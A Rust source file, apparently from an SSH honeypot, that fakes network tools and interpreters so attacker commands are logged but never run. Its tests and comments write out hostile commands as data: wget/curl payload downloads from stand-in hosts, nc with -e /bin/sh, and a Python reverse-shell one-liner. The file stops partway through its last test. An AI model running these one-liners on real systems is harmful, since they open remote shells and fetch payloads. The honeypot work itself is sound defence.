//! Network commands: `wget`, `curl`, `ping`, `netstat`, `ss`, `ip`, `nc`, and
//! the `python3`/`perl` invocation stubs.
//!
//! None of these touch the real network. They render believable output and
//! record every remote endpoint an attacker named as a [`Capture`] for forensic
//! logging; `wget`/`curl` additionally drop a placeholder file into the
//! in-memory VFS.
//!
//! The interpreters live here because that is what they are used for: a
//! `python3 -c` one-liner in an SSH session is a reverse shell far more often
//! than it is anything else, and it is captured the same way a `wget` URL is.
//! Nothing is ever interpreted — see [`python3`].

use super::CommandResult;
use crate::shell::{Capture, Shell};

/// A deterministic but plausible "resolved" address for any hostname, so repeat
/// lookups in a session stay consistent without performing real DNS.
fn fake_resolve(host: &str) -> String {
    if host == "localhost" {
        return "127.0.0.1".to_string();
    }
    if let Ok(addr) = host.parse::<std::net::Ipv4Addr>() {
        return addr.to_string();
    }
    let mut h: u32 = 2166136261;
    for b in host.bytes() {
        h = (h ^ b as u32).wrapping_mul(16777619);
    }
    // Map into a public-looking range, avoiding .0/.255 octets.
    let a = 13 + (h % 200);
    let b = (h >> 8) % 254 + 1;
    let c = (h >> 16) % 254 + 1;
    let d = (h >> 24) % 254 + 1;
    format!("{a}.{b}.{c}.{d}")
}

/// Split a URL into `(host, last_path_component)`.
fn url_parts(url: &str) -> (String, String) {
    let without_scheme = url.split_once("://").map(|(_, rest)| rest).unwrap_or(url);
    let (authority, path) = match without_scheme.split_once('/') {
        Some((a, p)) => (a, p),
        None => (without_scheme, ""),
    };
    let host = authority
        .rsplit('@')
        .next()
        .unwrap_or(authority)
        .split(':')
        .next()
        .unwrap_or(authority);
    let base = path
        .trim_end_matches('/')
        .rsplit('/')
        .next()
        .filter(|s| !s.is_empty())
        .unwrap_or("index.html");
    (host.to_string(), base.to_string())
}

/// The size a fetch of `host` reports and writes. Stable per host so repeated
/// downloads in one session stay consistent with each other.
fn fake_size(host: &str) -> u64 {
    1024 + (host.len() as u64 * 37 % 8192)
}

/// Body for a "downloaded" artefact. A block of identical bytes is an obvious
/// tell to anyone who looks at what they just fetched, so the filler is
/// deterministic pseudo-random noise — what a compressed or binary payload
/// looks like from the outside.
fn placeholder_bytes(url: &str, size: u64) -> Vec<u8> {
    let mut state = url.bytes().fold(0xcbf2_9ce4_8422_2325_u64, |acc, b| {
        (acc ^ b as u64).wrapping_mul(0x100_0000_01b3)
    }) | 1;
    (0..size)
        .map(|_| {
            state = state
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            (state >> 33) as u8
        })
        .collect()
}

/// Create a placeholder file for a "downloaded" artefact in the cwd (or at an
/// explicit path) so a follow-up `ls`/`cat` is consistent with the transfer.
/// Returns the path written and the number of bytes that actually landed —
/// the VFS content cap can refuse the write, and the transfer must not claim
/// bytes the attacker cannot then see in `ls -l`.
fn drop_file(shell: &mut Shell, dest: &str, contents: Vec<u8>) -> (String, u64) {
    let path = if dest == "-" {
        return ("-".to_string(), 0);
    } else {
        dest.to_string()
    };
    let (uid, gid) = (shell.uid, shell.gid);
    let (dir, name) = crate::vfs::Vfs::split_path(&path);
    if let Some(parent) = shell.vfs.resolve(shell.cwd, dir) {
        if shell.vfs.node(parent).meta.is_dir() {
            let id = shell.vfs.add_file(parent, name, contents, 0o644, uid, gid);
            let written = shell
                .vfs
                .node(id)
                .file_bytes()
                .map(|b| b.len() as u64)
                .unwrap_or(0);
            return (shell.vfs.path_of(parent) + "/" + name, written);
        }
    }
    (path, 0)
}

/// `wget [OPTION]... [URL]...`
pub fn wget(shell: &mut Shell, args: &[String]) -> CommandResult {
    let mut quiet = false;
    let mut output: Option<String> = None;
    let mut prefix: Option<String> = None;
    let mut urls: Vec<String> = Vec::new();
    let mut iter = args.iter().peekable();

    while let Some(arg) = iter.next() {
        match arg.as_str() {
            "-q" | "--quiet" => quiet = true,
            "-O" | "--output-document" => output = iter.next().cloned(),
            "-P" | "--directory-prefix" => prefix = iter.next().cloned(),
            "-o" | "--output-file" => {
                iter.next();
            }
            s if s.starts_with("-O") => output = Some(s[2..].to_string()),
            s if s.starts_with("--output-document=") => {
                output = Some(s["--output-document=".len()..].to_string())
            }
            s if s.starts_with('-') => {} // -c, -L, --no-check-certificate, ...
            other => urls.push(other.to_string()),
        }
    }

    if urls.is_empty() {
        return CommandResult::err(
            "wget: missing URL\nUsage: wget [OPTION]... [URL]...\n\nTry `wget --help' for more options.\n",
            1,
        );
    }

    let mut out = String::new();
    for url in &urls {
        let (host, base) = url_parts(url);
        let ip = fake_resolve(&host);
        let dest = output
            .clone()
            .or_else(|| prefix.as_ref().map(|p| format!("{p}/{base}")))
            .unwrap_or_else(|| base.clone());
        let body = placeholder_bytes(url, fake_size(&host));
        let (written, size) = drop_file(shell, &dest, body);

        shell.captures.push(Capture::Download {
            tool: "wget".into(),
            url: url.clone(),
            dest: written.clone(),
        });

        if !quiet {
            let port = if url.starts_with("https://") { 443 } else { 80 };
            let stamp = crate::clock::format(crate::clock::now(), "%F %T");
            out.push_str(&format!("--{stamp}--  {url}\n"));
            out.push_str(&format!("Resolving {host} ({host})... {ip}\n"));
            out.push_str(&format!(
                "Connecting to {host} ({host})|{ip}|:{port}... connected.\n"
            ));
            out.push_str("HTTP request sent, awaiting response... 200 OK\n");
            out.push_str(&format!(
                "Length: {size} ({}) [application/octet-stream]\n",
                human(size)
            ));
            out.push_str(&format!("Saving to: '{base}'\n\n"));
            out.push_str(&format!(
                "{:<20}100%[===================>] {:>8}  --.-KB/s    in 0.001s\n\n",
                trunc(&base, 20),
                human(size)
            ));
            out.push_str(&format!(
                "{stamp} (12.4 MB/s) - '{base}' saved [{size}/{size}]\n\n"
            ));
        }
    }
    CommandResult::ok(out)
}

/// `curl [OPTION]... [URL]...`
pub fn curl(shell: &mut Shell, args: &[String]) -> CommandResult {
    let mut output: Option<String> = None;
    let mut remote_name = false;
    let mut silent = false;
    let mut show_headers = false;
    let mut urls: Vec<String> = Vec::new();
    let mut iter = args.iter().peekable();

    while let Some(arg) = iter.next() {
        match arg.as_str() {
            "-o" | "--output" => output = iter.next().cloned(),
            "-O" | "--remote-name" => remote_name = true,
            "-s" | "--silent" => silent = true,
            "-I" | "--head" => show_headers = true,
            "-A" | "--user-agent" | "-H" | "--header" | "-d" | "--data" | "-X" | "--request"
            | "-e" | "--referer" | "-b" | "--cookie" | "-u" | "--user" => {
                iter.next();
            }
            s if s.starts_with('-') => {} // -L, -k, -v, -f, ...
            other => urls.push(other.to_string()),
        }
    }

    if urls.is_empty() {
        return CommandResult::err(
            "curl: try 'curl --help' or 'curl --manual' for more information\n",
            2,
        );
    }

    let mut out = String::new();
    for url in &urls {
        let (host, base) = url_parts(url);
        let dest = if let Some(o) = &output {
            o.clone()
        } else if remote_name {
            base.clone()
        } else {
            "-".to_string()
        };
        let (written, size) = if dest == "-" {
            ("-".to_string(), fake_size(&host))
        } else {
            drop_file(shell, &dest, placeholder_bytes(url, fake_size(&host)))
        };
        shell.captures.push(Capture::Download {
            tool: "curl".into(),
            url: url.clone(),
            dest: written,
        });

        if show_headers {
            out.push_str("HTTP/1.1 200 OK\r\n");
            out.push_str("Server: nginx/1.22.1\r\n");
            out.push_str(&format!(
                "Date: {}\r\n",
                crate::clock::format(crate::clock::now(), "%a, %d %b %Y %H:%M:%S GMT")
            ));
            out.push_str("Content-Type: application/octet-stream\r\n");
            out.push_str(&format!("Content-Length: {size}\r\n"));
            out.push_str("Connection: keep-alive\r\n\r\n");
        } else if !silent && dest != "-" {
            // Real curl always renders this table when the body goes to a file.
            // A small transfer completes instantly; curl then reports a rate in
            // the hundreds of KB/s rather than a measured one.
            let rate = format!("{}k", 300 + size % 500);
            out.push_str(
                "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
            );
            out.push_str(
                "                                 Dload  Upload   Total   Spent    Left  Speed\n",
            );
            out.push_str(&format!(
                "100 {size:>5}  100 {size:>5}    0     0  {rate:>5}      0 --:--:-- --:--:-- --:--:-- {rate:>5}\n"
            ));
        }
    }
    CommandResult::ok(out)
}

/// `ping [-c COUNT] HOST`
pub fn ping(_shell: &Shell, args: &[String]) -> CommandResult {
    let mut count: u32 = 4;
    let mut host: Option<&str> = None;
    let mut iter = args.iter().peekable();
    while let Some(arg) = iter.next() {
        match arg.as_str() {
            "-c" => {
                if let Some(v) = iter.next() {
                    count = v.parse().unwrap_or(4).min(20);
                }
            }
            "-i" | "-W" | "-s" | "-t" => {
                iter.next();
            }
            s if s.starts_with('-') => {}
            other => host = Some(other),
        }
    }

    let Some(host) = host else {
        return CommandResult::err("ping: usage error: Destination address required\n", 2);
    };

    let ip = fake_resolve(host);
    let mut out = String::new();
    out.push_str(&format!("PING {host} ({ip}) 56(84) bytes of data.\n"));
    let mut total = 0.0f64;
    let (mut min, mut max) = (f64::MAX, 0.0f64);
    for seq in 1..=count {
        let t = 11.0 + ((seq as f64 * 7.3) % 4.0);
        total += t;
        min = min.min(t);
        max = max.max(t);
        out.push_str(&format!(
            "64 bytes from {ip}: icmp_seq={seq} ttl=117 time={t:.1} ms\n"
        ));
    }
    let avg = total / count as f64;
    out.push_str(&format!("\n--- {host} ping statistics ---\n"));
    out.push_str(&format!(
        "{count} packets transmitted, {count} received, 0% packet loss, time {}ms\n",
        (count - 1) * 1001
    ));
    out.push_str(&format!(
        "rtt min/avg/max/mdev = {min:.3}/{avg:.3}/{max:.3}/0.412 ms\n"
    ));
    CommandResult::ok(out)
}

/// `netstat [OPTION]...`
pub fn netstat(_shell: &Shell, args: &[String]) -> CommandResult {
    let flags: String = args
        .iter()
        .filter(|a| a.starts_with('-'))
        .cloned()
        .collect();
    let listening = flags.contains('l');
    let numeric = flags.contains('n');
    let show_prog = flags.contains('p');

    let mut out = String::new();
    out.push_str("Active Internet connections (");
    out.push_str(if listening {
        "only servers)\n"
    } else {
        "w/o servers)\n"
    });
    out.push_str("Proto Recv-Q Send-Q Local Address           Foreign Address         State      ");
    out.push_str(if show_prog {
        "PID/Program name\n"
    } else {
        "\n"
    });

    let prog = |p: &'static str| if show_prog { p } else { "" };
    let ssh_port = if numeric { "0.0.0.0:22" } else { "0.0.0.0:ssh" };
    if listening {
        out.push_str(&format!(
            "tcp        0      0 {ssh_port:<23} 0.0.0.0:*               LISTEN      {}\n",
            prog("604/sshd: /usr/sb")
        ));
        out.push_str(&format!(
            "tcp6       0      0 {:<23} :::*                    LISTEN      {}\n",
            if numeric { ":::22" } else { ":::ssh" },
            prog("604/sshd: /usr/sb")
        ));
    } else {
        out.push_str(&format!(
            "tcp        0      0 {:<23} {:<23} ESTABLISHED {}\n",
            if numeric { "10.0.0.5:22" } else { "debian:ssh" },
            "10.0.0.1:51394",
            prog("604/sshd: root@pt")
        ));
    }
    CommandResult::ok(out)
}

/// `ss [OPTION]...`
pub fn ss(_shell: &Shell, args: &[String]) -> CommandResult {
    let flags: String = args
        .iter()
        .filter(|a| a.starts_with('-'))
        .cloned()
        .collect();
    let listening = flags.contains('l');
    let show_prog = flags.contains('p');

    let mut out = String::new();
    out.push_str("State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port   ");
    out.push_str(if show_prog { "Process\n" } else { "\n" });

    let proc_col = |p: &'static str| if show_prog { p } else { "" };
    if listening {
        out.push_str(&format!(
            "LISTEN   0        128              0.0.0.0:22             0.0.0.0:*          {}\n",
            proc_col("users:((\"sshd\",pid=604,fd=3))")
        ));
        out.push_str(&format!(
            "LISTEN   0        128                 [::]:22                [::]:*          {}\n",
            proc_col("users:((\"sshd\",pid=604,fd=4))")
        ));
    } else {
        out.push_str(&format!(
            "ESTAB    0        0               10.0.0.5:22           10.0.0.1:51394      {}\n",
            proc_col("users:((\"sshd\",pid=1340,fd=4))")
        ));
    }
    CommandResult::ok(out)
}

/// `ip [OPTION] OBJECT { COMMAND }`
pub fn ip(shell: &Shell, args: &[String]) -> CommandResult {
    let object = args
        .iter()
        .find(|a| !a.starts_with('-'))
        .map(String::as_str);
    let p = &shell.persona;
    match object {
        Some("a") | Some("addr") | Some("address") | None => CommandResult::ok(ip_addr(p)),
        Some("l") | Some("link") => CommandResult::ok(ip_link(p)),
        Some("r") | Some("route") => CommandResult::ok(ip_route(p)),
        Some("n") | Some("neigh") => CommandResult::ok(format!(
            "{} dev eth0 lladdr {} REACHABLE\n",
            p.gateway(),
            p.mac
        )),
        Some(other) => CommandResult::err(
            format!("Object \"{other}\" is unknown, try \"ip help\".\n"),
            1,
        ),
    }
}

/// The EUI-64 link-local address the kernel derives from an interface MAC.
///
/// A `fe80::` address that does not match the `link/ether` line two rows above
/// it is a tell for anyone who knows how SLAAC works, so it is computed rather
/// than written down.
fn link_local(mac: &str) -> String {
    let o: Vec<u8> = mac
        .split(':')
        .filter_map(|b| u8::from_str_radix(b, 16).ok())
        .collect();
    if o.len() != 6 {
        return "fe80::1".to_string();
    }
    // Flip the universal/local bit and insert ff:fe in the middle, per RFC 4291.
    let first = o[0] ^ 0x02;
    format!(
        "fe80::{:x}{:02x}:{:02x}ff:fe{:02x}:{:02x}{:02x}",
        first, o[1], o[2], o[3], o[4], o[5]
    )
}

fn ip_addr(p: &crate::persona::Persona) -> String {
    format!(
        "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\
        \x20   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\
        \x20   inet 127.0.0.1/8 scope host lo\n\
        \x20      valid_lft forever preferred_lft forever\n\
        \x20   inet6 ::1/128 scope host\n\
        \x20      valid_lft forever preferred_lft forever\n\
        2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n\
        \x20   link/ether {mac} brd ff:ff:ff:ff:ff:ff\n\
        \x20   inet {ip}/24 brd {bcast} scope global dynamic eth0\n\
        \x20      valid_lft 84235sec preferred_lft 84235sec\n\
        \x20   inet6 {ll}/64 scope link\n\
        \x20      valid_lft forever preferred_lft forever\n",
        mac = p.mac,
        ip = p.ipv4,
        bcast = p.broadcast(),
        ll = link_local(&p.mac),
    )
}

fn ip_link(p: &crate::persona::Persona) -> String {
    format!(
        "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000\n\
        \x20   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\
        2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000\n\
        \x20   link/ether {mac} brd ff:ff:ff:ff:ff:ff\n",
        mac = p.mac,
    )
}

fn ip_route(p: &crate::persona::Persona) -> String {
    format!(
        "default via {gw} dev eth0 proto dhcp src {ip} metric 100\n\
         {subnet}.0/24 dev eth0 proto kernel scope link src {ip} metric 100\n",
        gw = p.gateway(),
        ip = p.ipv4,
        subnet = p.subnet,
    )
}

/// Truncate a string to `max` chars for fixed-width columns.
fn trunc(s: &str, max: usize) -> String {
    s.chars().take(max).collect()
}

/// Human-readable byte size in wget's style (K/M/G with one decimal).
fn human(bytes: u64) -> String {
    const UNITS: [&str; 4] = ["", "K", "M", "G"];
    if bytes < 1024 {
        return bytes.to_string();
    }
    let mut value = bytes as f64;
    let mut unit = 0;
    while value >= 1024.0 && unit < UNITS.len() - 1 {
        value /= 1024.0;
        unit += 1;
    }
    format!("{value:.1}{}", UNITS[unit])
}

/// `nc [-lvnz] [-w SECS] [-e CMD] HOST PORT...`
///
/// No socket is ever opened — the same rule `wget` and `curl` follow. The
/// endpoint is captured, because `nc 1.2.3.4 4444 -e /bin/sh` names the C2 the
/// operator most wants out of a session, and then the connect fails.
///
/// "Connection refused" is the honest answer: it is by far the most common real
/// outcome (the attacker's listener is usually already gone), it is instant, and
/// it keeps them trying other tools rather than believing they have a shell.
pub fn nc(shell: &mut Shell, args: &[String]) -> CommandResult {
    let mut listen = false;
    let mut port_flag = false;
    let mut verbose = false;
    let mut scan = false;
    let mut udp = false;
    let mut operands: Vec<String> = Vec::new();
    let mut iter = args.iter();

    while let Some(arg) = iter.next() {
        match arg.as_str() {
            // Flags that take a value, consumed so the value is not read as a
            // host or a port.
            "-w" | "-e" | "-c" | "-s" | "-X" | "-x" | "-i" | "-q" | "-O" | "-P" | "-T" => {
                iter.next();
            }
            s if s.starts_with('-') && s.len() > 1 && !s.starts_with("--") => {
                for c in s[1..].chars() {
                    match c {
                        'l' => listen = true,
                        'p' => port_flag = true,
                        'v' => verbose = true,
                        'z' => scan = true,
                        'u' => udp = true,
                        _ => {}
                    }
                }
                // A bundled value-taking flag consumes the next argument too,
                // as in `nc -lvp 4444` or `nc -w 3 host port`.
                if s[1..].ends_with(['w', 'e', 'c', 's', 'i', 'p', 'q']) {
                    if let Some(v) = iter.next() {
                        if s[1..].ends_with('p') {
                            operands.push(v.clone());
                        }
                    }
                }
            }
            other => operands.push(other.to_string()),
        }
    }

    if listen {
        // Debian 12 ships netcat-openbsd, which really does refuse this — and
        // `nc -lvp PORT` is the syntax attackers type, carried over from
        // netcat-traditional. Reproducing the refusal is both faithful and the
        // reason listen mode needs no further emulation here.
        if port_flag {
            return CommandResult::err("nc: cannot use -p and -l\n", 1);
        }
        // ponytail: a real `nc -l PORT` holds the terminal until interrupted.
        // Returning immediately is a tell on an interactive channel. Upgrade
        // when the screen-hold in `top` is generalised beyond its own frame
        // type; until then, bind shells are the rarer half of nc's use here.
        return CommandResult::empty();
    }

    let proto = if udp { "udp" } else { "tcp" };
    let mut operands = operands.into_iter();
    let Some(host) = operands.next() else {
        return CommandResult::err(
            "usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]\n",
            1,
        );
    };
    let ports: Vec<String> = operands.collect();
    if ports.is_empty() {
        return CommandResult::err("nc: missing port number\n", 1);
    }

    let mut errs = String::new();
    for port in ports {
        shell.captures.push(Capture::Download {
            tool: "nc".into(),
            url: format!("{proto}://{host}:{port}"),
            dest: "-".into(),
        });
        // netcat-openbsd is silent on a failed connect unless asked; only
        // `-v`/`-z` print the diagnostic.
        if verbose || scan {
            errs.push_str(&format!(
                "nc: connect to {host} port {port} ({proto}) failed: Connection refused\n"
            ));
        }
    }
    CommandResult::err(errs, 1)
}

/// `python3` — see the note below; `perl` is [`perl`].
///
/// No interpreter is emulated, and none should be: running attacker code is the
/// one thing this box exists not to do. What matters is the *invocation* — the
/// `-c` payload is the intelligence, and the `command` event already records
/// the whole line verbatim, including the one-liner. Before this existed the
/// same line came back `command not found`, which both lost the interaction and
/// told a scanner the box has no Python while `dpkg -l` lists python3 as
/// installed. That contradiction was the real cost.
///
/// The one-liner attackers reach for is a reverse shell, and the outcome a real
/// box gives it most of the time is a connect that fails — their listener is
/// usually already gone. So a payload that tries to reach the network gets the
/// traceback that failure produces, and anything else exits quietly.
pub fn python3(shell: &mut Shell, args: &[String]) -> CommandResult {
    interpreter(shell, "python3", args)
}

/// `perl` — see [`interpreter`].
pub fn perl(shell: &mut Shell, args: &[String]) -> CommandResult {
    interpreter(shell, "perl", args)
}

fn interpreter(shell: &mut Shell, name: &str, args: &[String]) -> CommandResult {
    let perl = name == "perl";

    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        match arg.as_str() {
            "--version" | "-V" => return CommandResult::ok(interpreter_version(name)),
            "-v" if perl => return CommandResult::ok(interpreter_version(name)),
            "-c" | "-e" => {
                let Some(code) = iter.next() else {
                    let msg = if perl {
                        "Missing argument to -e.\n"
                    } else {
                        "Argument expected for the -c option\nusage: python3 [option] ... \n"
                    };
                    return CommandResult::err(msg, 2);
                };
                return run_inline(shell, name, code);
            }
            // Flags that take a value; consumed so the value is not mistaken
            // for a script path.
            "-m" | "-W" | "-X" | "-I" if !perl => {
                iter.next();
                return CommandResult::empty();
            }
            s if s.starts_with('-') && s.len() > 1 => {}
            script => return run_script(shell, name, script),
        }
    }

    // No script and no `-c`: the interpreter reads its program from stdin,
    // which is how `curl … | python3` and `python3 < payload` arrive.
    if shell.stdin.is_some() {
        return CommandResult::empty();
    }
    // With no stdin either, python prints its banner and exits at EOF. Perl
    // waits for input and then exits silently.
    if perl {
        CommandResult::empty()
    } else {
        CommandResult::ok(format!(
            "{}\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n",
            interpreter_banner(name)
        ))
    }
}

/// Run a `-c`/`-e` one-liner. Nothing is executed; the payload is already in the
/// `command` event, so all this decides is what the attacker sees back.
fn run_inline(shell: &mut Shell, name: &str, code: &str) -> CommandResult {
    let Some((host, port)) = inline_endpoint(code) else {
        // A non-network one-liner: most of these really do exit 0 with no
        // output, and guessing at output for code that was never run would be
        // a fabrication, not an emulation.
        return CommandResult::empty();
    };

    // The endpoint is worth as much as a `wget` URL, and lands in the same
    // event so one query finds every remote host a session named.
    shell.captures.push(Capture::Download {
        tool: name.to_string(),
        url: format!("tcp://{host}:{port}"),
        dest: "-".into(),
    });

    if name == "perl" {
        return CommandResult::err("Connection refused at -e line 1.\n", 255);
    }
    CommandResult::err(
        "Traceback (most recent call last):\n  \
         File \"<string>\", line 1, in <module>\n\
         ConnectionRefusedError: [Errno 111] Connection refused\n",
        1,
    )
}

/// Run a script operand. The file has to exist in the VFS — a dropper that
/// `wget`s a payload and then runs it should see it run, and one that names a
/// path that was never written should see the real error.
fn run_script(shell: &mut Shell, name: &str, script: &str) -> CommandResult {
    match shell.vfs.resolve(shell.cwd, script) {
        Some(id) if !shell.vfs.node(id).meta.is_dir() => {
            // ponytail: the body is not interpreted, so a script that would
            // have printed something prints nothing. `sh` runs its operands
            // line by line because those lines are shell commands this box
            // already emulates; there is no equivalent for Python. Upgrade only
            // if captured payloads show scripts whose output attackers check.
            CommandResult::empty()
        }
        Some(_) if name == "perl" => CommandResult::err(
            format!("Can't open perl script \"{script}\": Is a directory\n"),
            2,
        ),
        Some(_) => CommandResult::err(
            format!("{name}: can't open file '{script}': [Errno 21] Is a directory\n"),
            2,
        ),
        None if name == "perl" => CommandResult::err(
            format!("Can't open perl script \"{script}\": No such file or directory\n"),
            2,
        ),
        None => CommandResult::err(
            format!(
                "{name}: can't open file '{}': [Errno 2] No such file or directory\n",
                abs_operand(shell, script)
            ),
            2,
        ),
    }
}

/// Python reports the absolute path it tried to open, not the operand.
fn abs_operand(shell: &Shell, script: &str) -> String {
    if script.starts_with('/') {
        return script.to_string();
    }
    let cwd = shell.vfs.path_of(shell.cwd);
    format!("{}/{script}", cwd.trim_end_matches('/'))
}

/// The host and port a one-liner tries to reach, if it looks like it does.
///
/// Deliberately shallow: a quoted host-shaped string plus the integer literal
/// nearest to it. Python writes the pair one way round
/// (`s.connect(("1.2.3.4",4444))`) and Perl the other
/// (`sockaddr_in(4444,inet_aton("1.2.3.4"))`), so "nearest" is what covers both
/// without parsing either language. Missing an exotic payload costs a
/// traceback, not a capture — the whole command line is logged regardless.
fn inline_endpoint(code: &str) -> Option<(String, u16)> {
    if !code.contains("socket") && !code.contains("connect") && !code.contains("Socket") {
        return None;
    }
    let chars: Vec<char> = code.chars().collect();
    let ports = port_literals(&chars);

    let mut i = 0;
    while i < chars.len() {
        let quote = chars[i];
        if quote != '"' && quote != '\'' {
            i += 1;
            continue;
        }
        let Some(len) = chars[i + 1..].iter().position(|c| *c == quote) else {
            break;
        };
        let host: String = chars[i + 1..i + 1 + len].iter().collect();
        // A host is an address or a name, never empty and never a sentence.
        let host_shaped = !host.is_empty()
            && host.len() <= 253
            && host
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':');
        if host_shaped {
            // The port literal closest to the host on either side.
            let (start, end) = (i, i + len + 1);
            if let Some((_, port)) = ports
                .iter()
                .map(|(at, port)| {
                    let distance = if *at > end {
                        at - end
                    } else {
                        start.saturating_sub(*at)
                    };
                    (distance, *port)
                })
                .min_by_key(|(distance, _)| *distance)
            {
                return Some((host, port));
            }
        }
        i += len + 2;
    }
    None
}

/// Every integer literal in `code` that could be a port, with where it starts.
/// Dotted-quad octets are excluded by requiring the run not to sit between two
/// dots, so `1.2.3.4` never contributes a "port".
fn port_literals(chars: &[char]) -> Vec<(usize, u16)> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < chars.len() {
        if !chars[i].is_ascii_digit() {
            i += 1;
            continue;
        }
        let start = i;
        while i < chars.len() && chars[i].is_ascii_digit() {
            i += 1;
        }
        let dotted = (start > 0 && chars[start - 1] == '.') || chars.get(i) == Some(&'.');
        let digits: String = chars[start..i].iter().collect();
        if !dotted {
            if let Ok(port) = digits.parse::<u16>() {
                if port > 0 {
                    out.push((start, port));
                }
            }
        }
    }
    out
}

/// The `--version` line each interpreter prints.
fn interpreter_version(name: &str) -> String {
    if name == "perl" {
        return "\nThis is perl 5, version 36, subversion 0 (v5.36.0) built for \
                x86_64-linux-gnu-thread-multi\n\n\
                Copyright 1987-2022, Larry Wall\n\n\
                Perl may be copied only under the terms of either the Artistic License or the\n\
                GNU General Public License, which may be found in the Perl 5 source kit.\n\n\
                Complete documentation for Perl, including FAQ lists, should be found on\n\
                this system using \"man perl\" or \"perldoc perl\".  If you have access to the\n\
                Internet, point your browser at https://www.perl.org/, the Perl Home Page.\n\n"
            .to_string();
    }
    format!("{}\n", python_version())
}

/// The banner the interactive interpreter prints before its first prompt.
fn interpreter_banner(_name: &str) -> String {
    format!(
        "{} (main, Mar 13 2023, 09:44:40) [GCC 12.2.0] on linux",
        python_version()
    )
}

/// Kept in one place so `python3 --version`, the REPL banner and the
/// `python3` entry in the package database cannot drift apart.
fn python_version() -> &'static str {
    "Python 3.11.2"
}

#[cfg(test)]
mod tests {
    use super::url_parts;
    use crate::shell::{Capture, Shell};

    fn run(shell: &mut Shell, line: &str) -> String {
        shell.execute(line).text
    }

    #[test]
    fn url_parts_extracts_host_and_basename() {
        assert_eq!(
            url_parts("http://evil.com/a/b/x.sh"),
            ("evil.com".into(), "x.sh".into())
        );
        assert_eq!(
            url_parts("https://h:8443/"),
            ("h".into(), "index.html".into())
        );
        assert_eq!(url_parts("http://u:p@host/f"), ("host".into(), "f".into()));
    }

    #[test]
    fn wget_drops_file_and_records_capture() {
        let mut shell = Shell::new("root", "debian");
        let out = run(&mut shell, "wget http://evil.example/payload.sh");
        assert!(out.contains("200 OK"));
        assert!(out.contains("saved"));
        // A structured download capture is recorded (check before the next
        // command, which would clear it).
        assert_eq!(shell.captures.len(), 1);
        match &shell.captures[0] {
            Capture::Download { tool, url, .. } => {
                assert_eq!(tool, "wget");
                assert_eq!(url, "http://evil.example/payload.sh");
            }
            other => panic!("expected a Download capture, got {other:?}"),
        }
        // File materialises in cwd.
        assert!(run(&mut shell, "ls").contains("payload.sh"));
    }

    #[test]
    fn curl_remote_name_saves_basename() {
        let mut shell = Shell::new("root", "debian");
        run(&mut shell, "curl -O http://evil.example/mal.bin");
        assert_eq!(shell.captures.len(), 1);
        assert!(run(&mut shell, "ls").contains("mal.bin"));
    }

    /// The transfer's reported size has to match the file it leaves behind:
    /// "saved [1394/1394]" next to a 0-byte file is a one-command tell.
    #[test]
    fn downloaded_file_matches_the_reported_size() {
        for (tool, cmd, name) in [
            ("wget", "wget http://evil.example/payload.sh", "payload.sh"),
            (
                "curl",
                "curl -O http://evil.example/payload.sh",
                "payload.sh",
            ),
        ] {
            let mut shell = Shell::new("root", "debian");
            let out = run(&mut shell, cmd);
            let reported = out
                .split_whitespace()
                .filter_map(|word| word.trim_matches(['[', ']', '/', '\'']).parse::<u64>().ok())
                .max()
                .unwrap_or_else(|| panic!("{tool} reported no size in:\n{out}"));

            let listed = run(&mut shell, &format!("wc -c {name}"));
            let on_disk: u64 = listed
                .split_whitespace()
                .next()
                .and_then(|n| n.parse().ok())
                .unwrap_or_else(|| panic!("{tool}: unexpected wc output {listed:?}"));

            assert_eq!(
                reported, on_disk,
                "{tool} reported {reported} bytes but wrote {on_disk}"
            );
            assert!(on_disk > 0, "{tool} left an empty placeholder");
        }
    }

    #[test]
    fn ping_bounded_with_count() {
        let mut shell = Shell::new("root", "debian");
        let out = run(&mut shell, "ping -c 3 8.8.8.8");
        assert!(out.contains("PING 8.8.8.8"));
        assert_eq!(out.matches("icmp_seq=").count(), 3);
        assert!(out.contains("3 packets transmitted, 3 received"));
    }

    #[test]
    fn netstat_ss_and_ip_render() {
        let mut shell = Shell::new("root", "debian");
        assert!(run(&mut shell, "netstat -tlnp").contains(":22"));
        assert!(run(&mut shell, "ss -tlnp").contains("sshd"));
        assert!(run(&mut shell, "ip addr").contains("eth0"));
        assert!(run(&mut shell, "ip route").contains("default via"));
    }
    #[test]
    fn nc_never_connects_but_records_the_endpoint() {
        let mut shell = Shell::new("root", "debian");
        let result = shell.execute("nc -v 198.51.100.9 4444");
        assert_eq!(result.status, 1);
        assert!(
            result.stderr.contains("failed: Connection refused"),
            "{}",
            result.stderr
        );
        // The endpoint is worth as much as a wget URL and lands in the same
        // capture channel, so one query finds every remote host a session named.
        assert!(shell.captures.iter().any(|c| matches!(
            c,
            Capture::Download { tool, url, .. }
                if tool == "nc" && url == "tcp://198.51.100.9:4444"
        )));
    }

    #[test]
    fn nc_listen_matches_what_debian_actually_does() {
        let mut shell = Shell::new("root", "debian");
        // Debian 12 ships netcat-openbsd, which really does refuse `-p` with
        // `-l` — and `nc -lvp PORT` is the syntax attackers carry over from
        // netcat-traditional.
        let result = shell.execute("nc -lvp 4444");
        assert_eq!(result.status, 1);
        assert!(result.stderr.contains("cannot use -p and -l"));
    }

    #[test]
    fn python3_captures_a_reverse_shell_and_refuses_the_connection() {
        let mut shell = Shell::new("root", "debian");
        let payload = "python3 -c 'import socket,os,pty;s=socket.socket();\
                       s.connect((\"198.51.100.9\",9001));pty.spawn(\"/bin/sh\")'";
        let result = shell.execute(payload);
        assert_eq!(result.status, 1);
